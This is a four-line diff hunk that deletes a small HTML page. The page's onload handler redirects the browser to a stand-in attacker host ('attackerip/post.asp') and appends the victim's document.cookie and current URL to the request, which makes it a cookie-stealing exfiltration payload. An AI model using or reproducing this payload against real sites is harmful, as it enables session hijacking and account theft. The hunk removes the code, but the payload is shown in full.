@@ -1,4 +1,0 @@
-<html>
-<body onload='document.location.replace("http://attackerip/post.asp?name=victim&message=" + document.cookie + "<br>" + "URL:" + document.location);'>
-</body>
-</html>
